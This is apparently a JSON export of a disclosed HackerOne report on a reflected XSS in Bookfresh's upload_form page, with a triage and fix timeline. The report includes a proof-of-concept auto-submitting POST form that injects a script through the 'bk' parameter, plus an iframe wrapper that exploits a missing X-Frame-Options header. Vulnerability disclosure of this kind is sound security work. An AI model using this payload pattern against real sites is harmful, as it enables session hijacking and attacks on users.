{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2017-08-01T10:31:45.998Z", 
    "voters": [
        "eveeez", 
        "axolotl", 
        "smit", 
        "hacklad"
    ], 
    "facebook_team?": false, 
    "has_bounty?": false, 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 31187, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": null, 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "Reflected XSS on www.bookfresh.com/index.html?view=upload_form", 
    "is_member_of_team?": null, 
    "vote_count": 4, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_create?": false, 
            "can_view?": true
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2017-08-31T10:31:46.066Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "singular_disclosure_disabled": false, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2014-10-13T13:53:31.345Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-10-13T13:53:31.345Z", 
            "actor": {
                "username": "skanalyst", 
                "url": "/skanalyst", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "bookfresh", 
            "message": "Thank you for your submission. We are looking into this further and will get back to you as soon as we have more information.\n", 
            "markdown_message": "<p>Thank you for your submission. We are looking into this further and will get back to you as soon as we have more information.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 141304, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2014-10-13T21:58:14.508Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2014-10-13T21:58:14.508Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "bookfresh", 
            "message": "Ok. Thank you.", 
            "markdown_message": "<p>Ok. Thank you.</p>\n", 
            "type": "Activities::Comment", 
            "id": 141671, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "stefanofinding", 
                "url": "/stefanofinding"
            }, 
            "created_at": "2015-03-27T03:23:00.293Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-03-27T03:23:00.293Z", 
            "actor": {
                "username": "rafaelmaza", 
                "url": "/rafaelmaza", 
                "profile_picture_urls": {
                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "bookfresh", 
            "message": "Sorry for the delay, a fix has been deployed, can you please verify?", 
            "markdown_message": "<p>Sorry for the delay, a fix has been deployed, can you please verify?</p>\n", 
            "type": "Activities::BugResolved", 
            "id": 364321, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-03-27T09:20:43.364Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-03-27T09:20:43.364Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "bookfresh", 
            "message": "Hi @rafaelmaza,\nseems fixed. 'bk' only accepts color values.", 
            "markdown_message": "<p>Hi <a href=\"/rafaelmaza\">@rafaelmaza</a>,<br>\nseems fixed. &#39;bk&#39; only accepts color values.</p>\n", 
            "type": "Activities::Comment", 
            "id": 364410, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-01T10:31:46.027Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-01T10:31:46.027Z", 
            "actor": {
                "username": "stefanofinding", 
                "url": "/stefanofinding", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/171/105ae4625a068f093ee061fecb52da21caaa8627_medium.png?1509532580"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "bookfresh", 
            "first_to_agree": true, 
            "message": "I'm not sure it could be possible to disclose this report? Anyway, if someone is in the other side reading this message it would be great if you agree to disclose it.  \ud83d\udc4d", 
            "markdown_message": "<p>I&#39;m not sure it could be possible to disclose this report? Anyway, if someone is in the other side reading this message it would be great if you agree to disclose it.  \ud83d\udc4d</p>\n", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 1881936, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2017-08-31T10:31:55.045Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2017-08-31T10:31:55.045Z", 
            "actor": {
                "url": "/bookfresh", 
                "profile": {
                    "name": "Bookfresh"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/432/dcebdd192f010aa171b38679589726bbb43e1d11_medium.png?1410280265"
                }
            }, 
            "team_handle": "bookfresh", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 1968374, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "stefanofinding", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/stefanofinding", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/171/2b150e9b5657fcec95fe3961ebc01a9d5df9afb4_small.png?1509532580"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 60, 
        "name": "Cross-site Scripting (XSS) - Generic"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -39960094.44842955, 
    "disclosed_at": "2017-08-31T10:31:55.025Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/31187", 
    "created_at": "2014-10-13T01:52:44.576Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>The issue is in the view <u>upload_form</u>.</p>\n\n<p><strong>Description</strong><br>\nWhen you show an upload form in the site you use an URL like this: <a title=\"https://www.bookfresh.com/index.html?standalone=1&amp;e=0c551a759eb62ba457d017569617eaa8&amp;bk=FFFFFF&amp;view=upload_form\" href=\"/redirect?signature=a2a1de55c393f5f86a0953430ab5360f69320bf2&amp;url=https%3A%2F%2Fwww.bookfresh.com%2Findex.html%3Fstandalone%3D1%26e%3D0c551a759eb62ba457d017569617eaa8%26bk%3DFFFFFF%26view%3Dupload_form\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.bookfresh.com/index.html?standalone=1&amp;e=0c551a759eb62ba457d017569617eaa8&amp;bk=FFFFFF&amp;view=upload_form</span><i class=\"icon-external-link\"></i></a><br>\nAnd you show the value of the parameter <code>bk</code> in the page: <code>&lt;style&gt;body{ background-color: #[VALUE_OF_BK]; }&lt;/style&gt;</code>. </p>\n\n<p>You have protection for XSS because you encode or remove tags like <code>&lt;script&gt;</code>, etc.<br>\nBut the problem is that you are only protecting the <code>GET</code> requests. So, if I do a <code>POST</code> request the value of <code>bk</code> is shown in the page without encoding or removing the tags.</p>\n\n<p>Another problem is that when the file <a title=\"https://www.bookfresh.com/index.html\" href=\"/redirect?signature=ef6ddb535bbcef8db7e53aeeb4cf9fb8a53eee58&amp;url=https%3A%2F%2Fwww.bookfresh.com%2Findex.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://www.bookfresh.com/index.html</span><i class=\"icon-external-link\"></i></a> is loaded from the server there is not <code>X-Frame-Options</code> header set in the response. So, it will be more easy to exploit the vulnerability.</p>\n\n<p><strong>Steps to reproduce</strong>:</p>\n\n<ol>\n<li>\n<p>Create a HTML file with this content:</p>\n<pre class=\"highlight plaintext\"><code>&lt;form action=&quot;https://www.bookfresh.com/index.html&quot; method=&quot;post&quot;&gt;\n &lt;input type=&quot;hidden&quot; name=&quot;bk&quot; value=&quot;&lt;/style&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt;&lt;style&gt;&quot;&gt;\n &lt;input type=&quot;hidden&quot; name=&quot;view&quot; value=&quot;upload_form&quot;&gt;\n&lt;/form&gt;\n&lt;script&gt;\n document.forms[0].submit();\n&lt;/script&gt;\n</code></pre>\n</li>\n<li>\n<p>Create a HTML file with this content:</p>\n<pre class=\"highlight plaintext\"><code>&lt;iframe src=&quot;[path_of_the_file_from_step_1]&quot;&gt;&lt;/iframe&gt;\n</code></pre>\n</li>\n<li><p>Put the files on a server or run a test server on the localhost with something like: <code>php -S localhost:8000</code></p></li>\n<li><p>Visit the file created in the step 2 and wait a few seconds.</p></li>\n<li><p>You will see an <code>alert()</code> with the domain of the frame: <a href=\"/redirect?signature=ee4fb31a92e919911730c8b27906dac0f7429479&amp;url=http%3A%2F%2Fwww.bookfresh.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>www.bookfresh.com</span><i class=\"icon-external-link\"></i></a>.</p></li>\n</ol>\n\n<p>It works on the last version of Firefox and it doesn&#39;t work on the last version of Chrome.</p>\n", 
    "vulnerability_information": "The issue is in the view _upload_form_.\r\n\r\n**Description**\r\nWhen you show an upload form in the site you use an URL like this: https://www.bookfresh.com/index.html?standalone=1&e=0c551a759eb62ba457d017569617eaa8&bk=FFFFFF&view=upload_form\r\nAnd you show the value of the parameter `bk` in the page: `<style>body{ background-color: #[VALUE_OF_BK]; }</style>`. \r\n\r\nYou have protection for XSS because you encode or remove tags like `<script>`, etc.\r\nBut the problem is that you are only protecting the `GET` requests. So, if I do a `POST` request the value of `bk` is shown in the page without encoding or removing the tags.\r\n\r\nAnother problem is that when the file https://www.bookfresh.com/index.html is loaded from the server there is not `X-Frame-Options` header set in the response. So, it will be more easy to exploit the vulnerability.\r\n\r\n**Steps to reproduce**:\r\n1. Create a HTML file with this content:\r\n\r\n        <form action=\"https://www.bookfresh.com/index.html\" method=\"post\">\r\n         <input type=\"hidden\" name=\"bk\" value=\"</style><script>alert(document.domain);</script><style>\">\r\n         <input type=\"hidden\" name=\"view\" value=\"upload_form\">\r\n        </form>\r\n        <script>\r\n         document.forms[0].submit();\r\n        </script>\r\n\r\n2. Create a HTML file with this content:\r\n\r\n        <iframe src=\"[path_of_the_file_from_step_1]\"></iframe>\r\n\r\n3. Put the files on a server or run a test server on the localhost with something like: `php -S localhost:8000`\r\n4. Visit the file created in the step 2 and wait a few seconds.\r\n5. You will see an `alert()` with the domain of the frame: www.bookfresh.com.\r\n\r\nIt works on the last version of Firefox and it doesn't work on the last version of Chrome.", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.bookfresh.com/", 
            "about": "Let your customers book and pay online from any device, 24/7. While you\u2019re busy with your customers, BookFresh is busy filling up your schedule.", 
            "twitter_handle": "", 
            "name": "Bookfresh"
        }, 
        "handle": "bookfresh", 
        "url": "https://hackerone.com/bookfresh", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/000/432/9a12b378c236929106efa1c80213980235607419_small.png?1410280265", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/000/432/dcebdd192f010aa171b38679589726bbb43e1d11_medium.png?1410280265"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 432, 
        "default_currency": "usd"
    }, 
    "is_published": false
}